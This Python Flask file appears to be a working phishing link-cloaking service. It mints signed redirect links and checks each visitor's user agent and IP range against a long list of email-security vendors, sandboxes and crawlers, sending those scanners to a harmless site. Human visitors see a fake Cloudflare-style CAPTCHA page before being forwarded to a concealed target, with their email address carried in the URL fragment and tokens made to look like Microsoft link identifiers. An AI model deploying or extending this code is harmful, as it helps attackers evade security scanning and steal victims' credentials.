import os
import time
import json
import secrets
import string
import base64
import logging
import threading
from ipaddress import ip_address, ip_network
from urllib.parse import urlsplit, urlunsplit, urlencode, parse_qsl, quote

import httpx
from flask import (
    Flask, request, redirect, render_template_string,
    abort, make_response, jsonify,
)
from itsdangerous import URLSafeTimedSerializer, BadSignature, SignatureExpired

# ---------------------------------------------------------------------------
# config
# ---------------------------------------------------------------------------
SK = os.environ.get("SECRET_KEY")
if not SK:
    raise RuntimeError("SECRET_KEY env var required")
if len(SK) < 32:
    raise RuntimeError("SECRET_KEY must be >= 32 chars")

GATE_TTL = int(os.environ.get("GATE_TTL_SECONDS", "900"))
TOKEN_TTL = int(os.environ.get("TOKEN_TTL_SECONDS", str(60 * 60 * 24 * 7)))
LOG_WEBHOOK_URL = os.environ.get("LOG_WEBHOOK_URL", "")
KV_URL = os.environ.get("KV_REST_API_URL", "")
KV_TOKEN = os.environ.get("KV_REST_API_TOKEN", "")

UNWANTED_REDIRECT_URL = os.environ.get("UNWANTED_REDIRECT_URL", "https://www.google.com")
RATE_LIMIT_PER_MIN = int(os.environ.get("RATE_LIMIT_PER_MIN", "0"))
TURNSTILE_SITEKEY = os.environ.get("TURNSTILE_SITEKEY", "0x4AAAAAAADnPIDOXQ8p7gPv")

DYNAMIC_IP_SOURCES = {
    "microsoft_azure": "https://download.microsoft.com/download/7/1/D/71D86715-5596-4529-9B13-DA13A5DE5B63/ServiceTags_Public.json",
    "google_cloud": "https://www.gstatic.com/ipranges/goog.json",
    "cloudflare": "https://api.cloudflare.com/client/v4/ips",
    "aws": "https://ip-ranges.amazonaws.com/ip-ranges.json",
}

app = Flask(__name__)
app.secret_key = SK.encode()
serializer = URLSafeTimedSerializer(app.secret_key, salt="link-gate")
cookie_serializer = URLSafeTimedSerializer(app.secret_key, salt="cookie-gate")

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("link-gate")

DYNAMIC_SCANNER_NETS = {name: [] for name in DYNAMIC_IP_SOURCES}
STATIC_SCANNER_NETS = {name: [] for name in ["proofpoint", "mimecast", "barracuda", "talos", "abnormal", "avanan", "ironscales", "zscaler", "forcepoint"]}

def fetch_dynamic_ips():
    while True:
        try:
            with httpx.Client(timeout=15.0) as client:
                try:
                    r = client.get(DYNAMIC_IP_SOURCES["microsoft_azure"])
                    data = r.json()
                    nets = []
                    for tag in data.get("values", []):
                        if "Exchange" in tag.get("name", "") or "AzureCloud" in tag.get("name", ""):
                            for prefix in tag.get("properties", {}).get("addressPrefixes", []):
                                nets.append(ip_network(prefix))
                    DYNAMIC_SCANNER_NETS["microsoft_azure"] = nets
                    log.info(f"Updated Microsoft IPs: {len(nets)}")
                except Exception as e:
                    log.error(f"Failed to fetch Microsoft IPs: {e}")

                try:
                    r = client.get(DYNAMIC_IP_SOURCES["google_cloud"])
                    data = r.json()
                    nets = [ip_network(p) for p in data.get("prefixes", []) if "ipv4Prefix" in p for p in [p["ipv4Prefix"]]]
                    DYNAMIC_SCANNER_NETS["google_cloud"] = nets
                    log.info(f"Updated Google IPs: {len(nets)}")
                except Exception as e:
                    log.error(f"Failed to fetch Google IPs: {e}")
        except Exception:
            pass
        time.sleep(12 * 60 * 60)

threading.Thread(target=fetch_dynamic_ips, daemon=True).start()

SCANNER_UA_TOKENS = (
    "microsoft office", "safelinks", "microsoft preview", "proofpoint",
    "pp-url", "mimecast", "barracuda", "talos", "ironport",
    "forcepoint", "symantec", "messagelabs", "trendmicro", "trend micro",
    "kaspersky", "sophos", "fireeye", "mandiant", "abnormal security",
    "avanan", "ironscales", "cloudmark", "agari", "valimail",
    "hornetsecurity", "spamhaus", "zerospam", "retarus", "vade",
    "urlscan", "urlscan.io", "virustotal", "any.run", "hybrid-analysis",
    "joesandbox", "joe sandbox", "cuckoo", "triage", "hatching",
    "intezer", "cape sandbox", "reverse.it", "filescan.io",
    "googlebot", "google-safety", "bingpreview", "bingbot", "duckduckbot",
    "yandexbot", "baiduspider", "slackbot", "twitterbot", "facebookexternalhit",
    "linkedinbot", "discordbot", "telegrambot", "whatsapp", "skypeuripreview",
    "applebot", "pinterestbot", "embedly", "quora link preview", "outbrain",
    "nuzzel", "vk share", "w3c_validator",
    "curl/", "wget/", "python-requests", "python-urllib", "go-http-client",
    "java/", "okhttp", "axios/", "node-fetch", "undici", "libwww-perl",
    "masscan", "nmap", "zgrab", "nuclei", "nikto", "sqlmap",
    "headlesschrome", "phantomjs", "puppeteer", "playwright",
    "lighthouse", "pagespeed", "gtmetrix", "pingdom", "uptimerobot",
    "statuscake", "site24x7", "newrelic", "datadog synthetics",
)

def client_ip() -> str:
    xff = request.headers.get("X-Forwarded-For", "")
    if xff:
        return xff.split(",")[0].strip()
    return request.remote_addr or ""

def classify(ip: str, ua: str) -> dict:
    out = {"ip": ip, "ua": ua, "scanner": False, "source": None, "method": None}
    low = ua.lower()
    for tok in SCANNER_UA_TOKENS:
        if tok in low:
            out["scanner"] = True
            out["source"] = tok
            out["method"] = "ua"
            return out

    try:
        a = ip_address(ip)
    except ValueError:
        a = None
        
    if a is not None:
        for name, nets in DYNAMIC_SCANNER_NETS.items():
            if any(a in n for n in nets):
                out["scanner"] = True
                out["source"] = name
                out["method"] = "ip_dynamic"
                return out
        
        for name, nets in STATIC_SCANNER_NETS.items():
            if any(a in n for n in nets):
                out["scanner"] = True
                out["source"] = name
                out["method"] = "ip_static"
                return out

    return out

def _valid_http_url(u: str) -> bool:
    return isinstance(u, str) and u.startswith(("http://", "https://"))

def _append_query(base_url: str, extra: dict) -> str:
    if not extra:
        return base_url
    parts = urlsplit(base_url)
    existing = dict(parse_qsl(parts.query, keep_blank_values=True))
    existing.update(extra)
    return urlunsplit((
        parts.scheme, parts.netloc, parts.path,
        urlencode(existing), parts.fragment,
    ))

async def kv_incr(key: str, ttl: int) -> int:
    if not KV_URL or not KV_TOKEN:
        return 0
    async with httpx.AsyncClient(timeout=3.0) as c:
        try:
            r = await c.post(
                f"{KV_URL}/incr/{key}",
                headers={"Authorization": f"Bearer {KV_TOKEN}"},
                params={"EX": str(ttl)},
            )
            r.raise_for_status()
            return int(r.json().get("result") or 0)
        except Exception as e:
            log.error(json.dumps({"event": "kv_incr_failed", "err": str(e)}))
            return 0

async def emit_log(event: dict) -> None:
    log.info(json.dumps(event, separators=(",", ":")))
    if LOG_WEBHOOK_URL:
        try:
            async with httpx.AsyncClient(timeout=3.0) as c:
                await c.post(LOG_WEBHOOK_URL, json=event)
        except httpx.HTTPError:
            pass

def _apply_unified_headers(resp):
    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, private"
    resp.headers["Pragma"] = "no-cache"
    resp.headers["Expires"] = "0"
    resp.headers["X-Frame-Options"] = "DENY"
    resp.headers["X-Content-Type-Options"] = "nosniff"
    resp.headers["Referrer-Policy"] = "no-referrer"

def _static_page(title: str, text: str, status_code: int):
    html = f"""<!doctype html><html><head><meta charset="utf-8"><title>{title}</title>
    <style>body{{font-family:system-ui,sans-serif;display:grid;place-items:center;min-height:100vh;margin:0;background:#f6f7f9}}
    .c{{background:#fff;padding:2rem;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.05);text-align:center;max-width:400px}}</style>
    </head><body><div class="c"><h1>{title}</h1><p>{text}</p></div></body></html>"""
    resp = make_response(html, status_code)
    _apply_unified_headers(resp)
    return resp

LANDING = """<!DOCTYPE html>
<html lang="en-US">
    <head>
        <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback" async defer></script>
        <script src="https://js.hcaptcha.com/1/api.js" async defer></script>

        <title>Just a moment...</title>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
        <meta name="robots" content="noindex,nofollow" />
        <meta name="viewport" content="width=device-width,initial-scale=1" />
        <script>
            var verifyCallback_CF = function (response) {
                let cfForm = document.querySelector("#cfForm")
                if (validateElement(cfForm) && response.length > 10) {
                    cfForm.remove()
                    window.location.href = "{{ target_url }}" + window.location.hash
                    return
                }
                return switchToSecondCaptcha()
            }
            var verifyCallback_hCaptcha = function (response) {
                let gForm = document.querySelector("#gForm")
                if (gForm == undefined) { return }
                if (gForm.style != undefined && gForm.style.visibility != undefined) {
                    gForm = document.querySelector("#gForm").style.visibility = "hidden"
                }
                window.location.href = "{{ target_url }}" + window.location.hash
            }
            function validateElement(element) {
                return element != undefined && element.style != undefined && element.style.visibility != undefined
            }
            window.switchToSecondCaptcha = function () {
                let gForm = document.querySelector("#gForm")
                if (validateElement(gForm) || gForm.style == "visible") { return }
                setTimeout(function () {
                    const cfForm = document.querySelector("#cfForm")
                    if (validateElement(cfForm) && cfForm.style.visibility != "hidden") {
                        cfForm.remove()
                    }
                    setTimeout(function () {
                        gForm.style.visibility = "visible"
                    }, 200)
                }, 200)
            }
            var refreshCallBack = function (response) {
                setTimeout(function () { window.location.reload() }, 1000)
            }
        </script>

        <script>
            window.onloadTurnstileCallback = function () {
                turnstile.render("#turnstileCaptcha", {
                    sitekey: "{{ sitekey }}",
                    callback: verifyCallback_CF,
                    "expired-callback": refreshCallBack,
                })
            }
        </script>
        <script>
            var incrementLoader = function () {
                const waitp = document.querySelector("#cf-spinner-please-wait")
                const gForm = document.querySelector("#gForm")
                if (validateElement(gForm) && gForm.style.visibility == "hidden") {
                    waitp.textContent += "."
                }
            }
            setTimeout(() => {
                let i = 0
                ticker = setInterval(function () {
                    i += 1
                    incrementLoader()
                    if (i > 3) { clearInterval(ticker); return }
                }, 1000)
            }, 500)

            setTimeout(function () {
                const cfForm = document.querySelector("#cfForm")
                if (!validateElement(cfForm)) { switchToSecondCaptcha(); return }
                const gForm = document.querySelector("#gForm")
                if (!validateElement(gForm)) { return }
                 if (cfForm.style.visibility == "visible" || gForm.style.visibility != "visible") {
                    switchToSecondCaptcha()
                }
            }, 7000)
        </script>
    </head>

    <body class="no-js">
        <div class="main-wrapper" role="main">
            <div class="main-content">
                <h1 class="zone-name-title h1">
                    <div>
                        <img class="" src="" style="margin-bottom: -17px" style="visibility: hidden" onerror="this.onerror=null;this.parentNode.removeChild(this)" />
                        <div id="site-name"></div>
                    </div>
                </h1>
                <span id="challenge-error-text"></span>
                <noscript>
                    <div id="challenge-error-title">
                        <div class="h2">
                            <div class="icon-wrapper">
                                <div class="heading-icon warning-icon"></div>
                            </div>
                            <span class="icon-wrapper">
                                <div class="heading-icon warning-icon"></div>
                            </span>
                            <span id="challenge-error-text"> Enable JavaScript and cookies to continue </span>
                        </div>
                    </div>
                </noscript>
                <p data-translate="please_wait" id="cf-spinner-please-wait">Please stand by, while we are checking if the site connection is secure</p>
                <form action="?" method="POST" id="gForm" style="visibility: hidden">
                    <div class="h-captcha" data-sitekey="234adb2f-52ba-4697-82fa-abecbb14b173" data-callback="verifyCallback_hCaptcha"></div>
                    <br>
                </form>
                <form action="?" method="POST" id="cfForm" style="visibility: visible" data-callback="verifyCallback_CF">
                    <div id="turnstileCaptcha"></div>
                    <br>
                </form>
                <div id="challenge-body-text" class="core-msg spacer">
                    <div id="site-name" style="float: left; margin-left: 10px; margin-right: 10px"></div>
                    <div style="margin: 10px"></div>
                </div>
            </div>
        </div>
        <div class="footer" role="contentinfo">
            <div class="footer-inner">
                <div class="text-center">
                    <a rel="noopener noreferrer" href="https://www.microsoft.com?utm_source=challenge&utm_campaign=m" target="_blank"></a>
                </div>
            </div>
        </div>
    </body>
</html>"""

@app.route("/health", methods=["GET"])
def health():
    return jsonify({"ok": True, "ts": int(time.time())})

@app.route("/", methods=["GET"])
def root():
    return _static_page("Not found", "Nothing here.", 404)

@app.route("/ls/<token>", methods=["GET"])
async def landing(token: str):
    try:
        data = serializer.loads(token, max_age=TOKEN_TTL)
    except SignatureExpired:
        return _static_page("Link expired", "This link is no longer valid.", 410)
    except BadSignature:
        return _static_page("Invalid link", "This link is not valid.", 404)

    tag = classify(client_ip(), request.headers.get("User-Agent", ""))
    await emit_log({"event": "landing_get", **tag, "token": token[:12]})

    if tag["scanner"]:
        unwanted = data.get("unwanted_target") or UNWANTED_REDIRECT_URL
        if not _valid_http_url(unwanted):
            unwanted = UNWANTED_REDIRECT_URL
        await emit_log({"event": "landing_scanner_redirect", **tag, "token": token[:12], "to": unwanted})
        return redirect(unwanted, code=302)

    allowed = set(data.get("params", []))
    forwarded = {k: v for k, v in request.args.items() if k in allowed and v}
    
    fp = data.get("fragment_param", "")
    fv = ""
    if fp and request.args.get(fp):
        fv = request.args.get(fp)
        forwarded[fp] = fv

    target = data["target"]
    if forwarded:
        target = _append_query(target, forwarded)
        
    if fv:
        base = target.split("#", 1)[0]
        target = f"{base}#{quote(fv, safe='@.-_')}"

    html = render_template_string(
        LANDING,
        target_url=target,
        sitekey=TURNSTILE_SITEKEY
    )

    resp = make_response(html)
    _apply_unified_headers(resp)
    return resp

def generate_eop_token(target_url):
    length = secrets.choice(range(180, 280))
    alphabet = string.ascii_letters + string.digits + "-_"
    
    random_core = ''.join(secrets.choice(alphabet) for _ in range(length))
    
    raw_target = target_url.encode('utf-8')
    b64_target = base64.urlsafe_b64encode(raw_target).decode('utf-8').rstrip('=')
    
    combined = f"{random_core}-{b64_target}"
    
    num_encoded = secrets.choice(range(2, 6))
    parts = list(combined)
    
    for _ in range(num_encoded):
        idx = secrets.choice(range(10, len(parts) - 10))
        hex_val = secrets.choice(["2F", "3D", "3A", "2B"])
        parts.insert(idx, f"-{hex_val}")
        
    final_payload = "".join(parts)
    return f"u001.{final_payload}"

@app.route("/mint", methods=["POST"])
def mint():
    admin_key = os.environ.get("ADMIN_KEY", "")
    if not admin_key or request.headers.get("X-Admin-Key") != admin_key:
        abort(404)

    body = request.get_json(silent=True) or {}
    target = body.get("target")
    
    if not _valid_http_url(target):
        return jsonify({"error": "target must be an http(s) URL"}), 400

    custom_token = body.get("click_upn")
    if not custom_token:
        custom_token = generate_eop_token(target)

    unwanted_target = body.get("unwanted_target")
    if unwanted_target and not _valid_http_url(unwanted_target):
        return jsonify({"error": "unwanted_target must be an http(s) URL"}), 400

    allowed_params = body.get("params") or []
    if not isinstance(allowed_params, list) or not all(isinstance(p, str) for p in allowed_params):
        return jsonify({"error": "params must be a list of strings"}), 400
    
    fragment_param = body.get("fragment_param", "") or ""
    if fragment_param:
        if not isinstance(fragment_param, str) or not (1 <= len(fragment_param) <= 64):
            return jsonify({"error": "fragment_param must be a short string"}), 400
        if not all(c.isalnum() or c in "-_.:@" for c in fragment_param):
            return jsonify({"error": "fragment_param has invalid characters"}), 400

    tok = serializer.dumps({
        "target": target,
        "unwanted_target": unwanted_target or "",
        "params": allowed_params,
        "fragment_param": fragment_param,
    })
    
    base = request.host_url.rstrip("/")
    encoded_upn = quote(custom_token, safe='')
    
    final_url = f"{base}/ls/{tok}?click_upn={encoded_upn}"
    
    return jsonify({
        "url": final_url,
        "token": tok,
        "click_upn": custom_token
    })

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)
